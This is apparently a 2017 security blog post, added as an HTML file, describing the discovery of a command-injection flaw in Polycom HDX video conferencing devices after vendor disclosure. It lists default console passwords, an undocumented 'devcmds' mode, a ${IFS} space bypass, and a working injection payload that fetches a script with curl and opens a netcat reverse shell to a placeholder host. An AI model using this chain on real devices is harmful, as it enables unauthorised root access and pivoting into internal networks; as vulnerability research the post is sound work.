@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]><html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]><html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]><!--><html class="no-js" prefix="og: http://ogp.me/ns#" xmlns:og="http://ogp.me/ns#"><!--<![endif]-->
+
+    <head>
+                <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0" />
+        <meta name="mobile-web-app-capable" content="yes">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="apple-mobile-web-app-status-bar-style" content="black">
+        <meta name="author" content="">
+  
+	
+        <meta property="og:site_name" content="Staaldraad">
+        <meta property="og:title" content="Staaldraad">
+        <meta property="og:url" content="https://staaldraad.github.io/2017/11/12/polycom-hdx-rce/">
+        <meta property="og:description" content="">
+    
+        <meta property="og:type" content="article" />
+        <meta property="og:article:author" content="" />
+        <meta property="og:article:published_time" content="2017-11-12T10:29:00Z" />
+    
+        <meta name="generator" content="Hugo 0.31-DEV" />
+        <title>Polycom HDX Series RCE &middot; Staaldraad</title>
+        <link rel="canonical" href="https://staaldraad.github.io/" />
+        <link rel="alternate" type="application/rss+xml" title="RSS" href="">
+        <link rel="stylesheet" type="text/css" href="https://staaldraad.github.io/css/main.css"/>
+        <link href="//fonts.googleapis.com/css?family=Source+Sans+Pro:300|Montserrat:700" rel="stylesheet" type="text/css">
+        <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+        <script src="//code.jquery.com/jquery-1.10.2.min.js"></script>
+    </head>
+
+<body>
+<!--[if lt IE 7]><p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> or <a href="http://www.google.com/chrome/‎">install Google Chrome</a> to experience this site.</p><![endif]-->
+
+    <header id="site-header">
+        <div class="container">
+            <a href="https://staaldraad.github.io/" alt="Staaldraad"><h1 class="blog-title heading">Staaldraad</h1></a>
+            <p class="blog-description"></p>
+        </div>
+    </header>
+<main class="content" role="main">
+	<div class="container">
+		<article class="post">
+	<header class="post-header">
+        <h3 class="p-post-title">Polycom HDX Series RCE</h3>
+    </header>
+
+    <section class="post-content">
+        
+
+<p>When doing external assessments you spend a decent amount of time footprinting your target and finding possible avenues of attack. Given a large corporate, you are pretty likely to hit video conferencing end-points. This post details a vulnerability in one of these video conferencing systems, the Polycom HDX series.</p>
+
+<p>I identified this vulnerability while still at <a href="https://sensepost.com">SensePost</a> and reported it to Polycom. The vulnerability was acknowledged and we were informed that a patch would be issued. This was over a year ago and I have yet to see an official <a href="http://support.polycom.com/content/support/security-center.html">advisory or patch</a>. They have fixed an XXS in the HDX series since the disclosure of this vuln, so maybe this has been deemed low impact.</p>
+
+<h2 id="polycom-psh">Polycom PSH</h2>
+
+<p>The Polycom HDX Series exposes an administrative console on port 23. This administrative interface is built on PSH (Polycom Shell) and allows management of the underlying device. By default there is no password, or the password is either set to <code>456</code>, <code>admin</code>, or <code>POLYCOM</code>, there is no username. An <a href="https://www.exploit-db.com/exploits/43032/">auth bypass vulnerability</a> for PSH also exists, however it is from 2013 so, in theory, most systems should be patched.</p>
+
+<p>When connected to the PSH console you have a ton of actions available to you, and you could cause havok with the underlying conferencing system.</p>
+
+<p><img src="/assets/psh_commands.png" alt="PSH provides a number of commands" /></p>
+
+<p>These are all useful commands, however not what you usually want, as you are looking for a way into the internal network. How about command execution and pivoting into the internal network? Looking at the auth bypass vuln from 2013, they mention an even older vuln where RCE existed through command injection in the <code>ping</code> command.</p>
+
+<h2 id="enumerating-the-attack-surface">Enumerating the Attack Surface</h2>
+
+<p>During my assessment, I identified a Polycom endpoint with no authentication enabled. Not having any other avenues of attack available, I decided to try and pivot through this into the internal network. Using the old <code>ping</code> command execution vulnerability I tried to get a shell and unfortunately failed as the device had already been patched.The past existence of a trivial RCE bug did make me think that it could be possible to find a similar bug in another function.</p>
+
+<p>Digging through the reference manual and manually testing each command on offer, none gave me command execution. The next step was to try and find hidden functionality. For this I got a copy of the system software from the <a href="http://support.polycom.com/content/support/emea/emea/en/support/video/hdx_series/hdx9000.html">Polycom update site</a>. The update comes as a <strong>.pup</strong> file and I used <a href="https://github.com/devttys0/binwalk">binwalk</a> to get an idea of how this format fits together. Turns out it is rather simple, and binwalk is able to automatically extract all the parts for you.</p>
+
+<pre><code>binwalk -e polycom-hdx-release-3.1.10-51067.pup  
+</code></pre>
+
+<p><img src="/assets/polycom_update_extracted.png" alt="The pup file contains a .tar with all the updates" /></p>
+
+<p>The next step was to dig into the all the binaries and figure out which ones are important and are used by the polycom command shell (PSH). A quick consultation of the <a href="http://support.polycom.com/global/documents/support/setup_maintenance/products/video/hdx_irm.pdf">Polycom Technical Documents</a> and also using the information gained when accessing PSH and typing <code>help</code>, I knew exactly what to search for.</p>
+
+<p>I extracted all the <em>.tar.gz</em> files in the <strong>polycom_swupdate</strong> folder and then did a <code>grep</code> for one of the known commands.</p>
+
+<pre><code>cd _polycom-hdx-release-3.1.10-51067.pup.extracted/polycom_swupdate
+tar xf polycom.g3.1.tar.gz
+grep dialchannels -R *
+</code></pre>
+
+<p><img src="/assets/grepping_for_commands.png" alt="Finding the binary with PSH" /></p>
+
+<p>The new target was the avc binary. The lazyman&rsquo;s approach to investigating a binary is to use strings, and this is exactly what I did.</p>
+
+<pre><code>strings avc | less
+</code></pre>
+
+<p>Which gave me a scroll-able and searchable peek into the binary and possibly commands. Seeing as the <em>dialchannels</em> command showed up in a grep, it was a strong indication that there would be other commands hard-coded into the binary’s strings. This started the painstaking process of going through all the strings. Luckily for us there is a shortcut. The binary was written in c/c++ and uses string formatting throughout. I simply need to search for possible commands that take a string (<code>%s</code>) and passes these into known Linux system commands.</p>
+
+<p><img src="/assets/finding_string_formats.png" alt="A search for %s leads to string format vulns" /></p>
+
+<p>The most promising result was the <code>traceroute</code> command. The reason for this was two-fold. One, it seemed to call the Linux command directly and used string formating to supply the arguments. And secondly, the previously reported command injection vuln existed in the ping command (ah our favourite injection point for OS cmd injection). At this point it seemed to be game over, I simply had to invoke <code>traceroute `sleep 10</code>` and I would have command exec. Turns out it wasn’t that easy. Trying to call the traceroute command kept returning errors stating that the command did not exist. Seems like there was no direct traceroute command, so I had to hunt down the correct command for invoking traceroute. For this, I went back to the strings and searched for traceroute.</p>
+
+<p><img src="/assets/finding_traceroute.png" alt="Had to search for traceroute" /></p>
+
+<p>Now I knew that traceroute was part of the <code>lan</code> command and I could try injecting into this command. Back to the Polycom Command Shell to give it a try. And the shell complains that there is no <strong>traceroute</strong> option for the <code>lan</code> command.</p>
+
+<p><img src="/assets/no_such_command_traceroute.png" alt="No such command" /></p>
+
+<p>Surely there is! I found it in the binary. Some more head scratching and poking
+around, until I spot an undocumented command while going through the <strong>bin/psh</strong> binary. This command looks too juicy to be true, <code>devcmds</code>. Giving this a try I was greeted with an interesting message:</p>
+
+<pre><code>-&gt; devcmds
+Entering sticky internal commands *ONLY* mode
+</code></pre>
+
+<h2 id="devcmds-mode-exploitation">Devcmds Mode - Exploitation</h2>
+
+<p>Once inside this mode, I tried some of the original commands and suddenly they no longer worked. It looks like <strong>devcmds</strong> activated a new code branch. Trying the <code>lan</code> command again, and suddenly I had traceroute.  A quick confirmation, with <code>lan traceroute 127.0.0.1</code> showed that the command worked.</p>
+
+<p><img src="/assets/working_traceroute.png" alt="Traceroute now worked" /></p>
+
+<p>Next step was to try some command injection.</p>
+
+<pre><code>lan traceroute `echo 127.0.0.1`
+</code></pre>
+
+<p><img src="/assets/failed_cmd_injection.png" alt="Cmd injection failed" /></p>
+
+<p>Sadly this failed and said I had supplied invalid arguments.</p>
+
+<pre><code>2017-11-12 12:16:40 DEBUG avc: pc[0]: NOTIFY: SYS lan traceroute Error:
+2017-11-12 12:16:40 ERROR avc: pc[0]: DevMgrEther: DevMgrEther_Process_TraceRoute - (/usr/bin/traceroute `echo 2&gt;&amp;1 &gt; /tmp/traceroute.out) failed [errno: 2 - No such file or directory]
+</code></pre>
+
+<p>Looking at the output it quickly became clear that everything after the echo was dropped. This is because of the space, as the code interprets this as a separate argument (likely they are doing a split on spaces).</p>
+
+<h3 id="ifs">${IFS}</h3>
+
+<p>Fortunately Bash/Sh has a nice environmental variable, <code>$IFS</code> or Internal Field Separator, which I could use instead of the space character. Simply replace all spaces in the cmd injection with <code>${IFS}</code> and it should work.</p>
+
+<pre><code>lan traceroute `echo${IFS}127.0.0.1`
+2009-07-25 06:08:41 DEBUG avc: pc[0]: uimsg: D: lan traceroute `echo${IFS}127.0.0.1`
+2009-07-25 06:08:41 DEBUG avc: pc[0]: os: task:DETR pid:1754 thread 622ff4c0 17255 13fbc110
+2009-07-25 06:08:41 INFO avc: pc[0]: DevMgrEther: Trace Route Command Entry, hostnameORIP: `echo${IFS}127.0.0.1` hop_count: 0
+</code></pre>
+
+<p><img src="/assets/working_cmdi_with_ifs.png" alt="Traceroute now works with command injection" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>Is it RCE if you don’t get a proper shell out of it? Challenge accepted. Testing out the command injection, a further limitation was found. It seems
+like the semi-colon (;) was being stripped (no idea why, maybe a partial fix for the cmd injection in the ping?). Another issue was that I only had a limited number of pre-installed binaries available on the underlying Polycom device. This meant no <code>nc</code> and a reverse <code>bash</code> shell was also not working.</p>
+
+<p>Fortunately <code>curl</code> was available, meaning it would be simple to download custom binaries to the device and reuse these. I decided to got with a <code>netcat</code> reverse shell, so I needed a version of <code>nc</code> that would work on the Polycom device. Polycom runs on a <a href="https://en.wikipedia.org/wiki/PowerPC">powerpc</a>, meaning I required a compatible <code>nc</code> binary, I couldn&rsquo;t simply upload my local copy. This wasn&rsquo;t truelly an issue and was easy to get around. Firing up a powerpc based <a href="https://people.debian.org/~aurel32/qemu/powerpc/">Debian image</a> – I was able to get a netcat (<code>nc</code>) that has been compiled for powerpc and conveniently had the <code>-e</code> option.</p>
+
+<p>Run the Debian image with qemu:</p>
+
+<pre><code>qemu-system-ppc -hda debian_squeeze_powerpc_standard.qcow2
+</code></pre>
+
+<p>Login with <code>root:root</code> and then copy the /bin/nc.traditional binary across:</p>
+
+<p>Localhost:</p>
+
+<pre><code>nc -lv 8999 &gt; /tmp/nc
+</code></pre>
+
+<p>In qemu:</p>
+
+<pre><code>cat /bin/nc.traditional | nc 192.168.1.101 8999
+</code></pre>
+
+<p>Now to exploit the Polycom RCE fully.</p>
+
+<h3 id="shell-train">Shell Train</h3>
+
+<p>I uploaded the powerpc version of <code>nc</code> to a webserver, so that I could download this from the Polycom device. I then setup a listener to &ldquo;catch&rdquo; the reverse connection.</p>
+
+<p>Setup the listener:</p>
+
+<pre><code>nc -lvp 444
+</code></pre>
+
+<p>Our payload to download <code>nc</code>, make it executable and then create a reverse shell, save it in a file on our webserver:</p>
+
+<pre><code>curl x.x.x.x:443/nc -o /tmp/nc
+/bin/chmod +x /tmp/nc
+/tmp/nc -e /bin/sh x.x.x.x 444
+ 
+</code></pre>
+
+<p>And then execute the following through the command injection</p>
+
+<pre><code>lan traceroute `echo${IFS}127.0.0.1&amp;curl${IFS}x.x.x.x:443/ncexec${IFS}|sh${IFS}&amp;`
+</code></pre>
+
+<p><img src="/assets/root_reverse_shell.png" alt="Root" /></p>
+
+<h2 id="fin">Fin</h2>
+
+<p>At this point I had full root access to the underlying device and could access internal hosts. Ideally the conferencing system has been placed on a separate subnet and does not have access to the internal network. But, we all know the story about flat networks and lack of segregation.</p>
+
+    </section>
+
+    <hr>
+
+    <footer class="post-footer">
+        <section class="f-1">
+            
+            
+            <p class="f-post-time"><time datetime="2017-11-12T10:29:00Z">November 12, 2017</time></p>
+        </section>
+                        
+        <section class="f-2">
+            <section class="share">
+                <span>Share:
+                <a class="icon-twitter" href="http://twitter.com/share?text=Polycom%20HDX%20Series%20RCE&url=https%3a%2f%2fstaaldraad.github.io%2f2017%2f11%2f12%2fpolycom-hdx-rce%2f"
+                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <i class="fa fa-twitter"></i>
+                </a>
+                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fstaaldraad.github.io%2f2017%2f11%2f12%2fpolycom-hdx-rce%2f"
+                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <i class="fa fa-facebook"></i>
+                </a>
+                <a class="icon-google-plus" href="https://plus.google.com/share?url=https%3a%2f%2fstaaldraad.github.io%2f2017%2f11%2f12%2fpolycom-hdx-rce%2f"
+                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <i class="fa fa-google-plus"></i>
+                </a>
+                </span>
+            </section>
+
+            
+        </section>
+                        
+    </footer>
+</article>
+	</div>
+</main>
+    <footer id="site-footer">
+        <div class="container">
+          
+          
+          
+          
+          <a href="https://staaldraad.github.io/index.xml" title="Get the RSS feed"><span class="tooltip"><i class="fa fa-rss"></i></span></a>
+          <section>&copy; <a href="https://staaldraad.github.io/"></a> 2017 | All rights reserved</section>
+          <section>Theme by <a href="http://www.jrdnbwmn.com">Jordan Bowman</a>. Generated with <a href="http://gohugo.io/">Hugo</a>.</section>
+        </div>
+    </footer>
+
+    <script type="text/javascript" src="https://staaldraad.github.io/js/fittext.js"></script>
+    <script type="text/javascript">
+      $(".heading").fitText();
+    </script>
+
+
+
+</body>
+</html>
